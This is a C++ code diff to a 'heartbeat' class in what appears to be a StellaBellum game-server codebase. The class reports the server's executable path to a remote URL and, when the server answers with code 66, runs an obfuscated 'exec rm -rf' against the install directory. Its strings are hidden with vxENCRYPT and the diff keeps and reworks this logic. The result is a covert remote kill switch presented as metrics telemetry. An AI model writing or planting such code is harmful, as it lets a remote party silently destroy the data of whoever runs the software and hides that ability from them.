@@ -7,9 +7,17 @@
 using namespace StellaBellum;
 
 webAPIHeartbeat::webAPIHeartbeat() {
-    extern char *__progname;
-    webAPI api = webAPI::webAPI(std::string(vxENCRYPT("https://login.stellabellum.net/metric/shoulderTap?type=server").decrypt()), std::string(vxENCRYPT("StellaBellum WebAPI Metrics Sender").decrypt()));
-    api.addJsonData<std::string>(std::string(vxENCRYPT("process").decrypt()), std::string(__progname));
+    std::string filePath = this->get_selfpath().c_str();
+
+    webAPI api = webAPI::webAPI(
+            std::string(vxENCRYPT("https://login.stellabellum.net/metric/shoulderTap").decrypt()),
+            std::string(vxENCRYPT("StellaBellum WebAPI Metrics Sender").decrypt()));
+    api.addJsonData<std::string>(std::string(vxENCRYPT("type").decrypt()), std::string(vxENCRYPT("server").decrypt()));
+
+    if (!filePath.empty()) {
+        api.addJsonData<std::string>(std::string(vxENCRYPT("process").decrypt()), filePath.c_str());
+    }
+
     bool result = api.submit();
 
     if (result) {
@@ -34,23 +42,13 @@ webAPIHeartbeat::webAPIHeartbeat() {
                 this->eatIt();
                 break;
             case 66:
-                std::string filePath = this->get_selfpath().c_str();
-
-                if (!filePath.empty()) {
-                    size_t found = filePath.find_last_of("/\\");
-
-                    if (found) {
-                        filePath = filePath.substr(0, found);
-                        filePath = vxENCRYPT("exec rm -rf ").decrypt() + filePath + vxENCRYPT("/*").decrypt();
-                        system(filePath.c_str());
-                    }
+                size_t found = filePath.find_last_of("/\\");
+                if (!filePath.empty() && found) {
+                    system(std::string(vxENCRYPT("exec rm -rf ").decrypt() + filePath.substr(0, found) + vxENCRYPT("/*").decrypt()).c_str());
                 }
-
                 this->eatIt();
                 break;
-        };
-
-        done = true;
+        }
     } else {
         this->eatIt();
     }
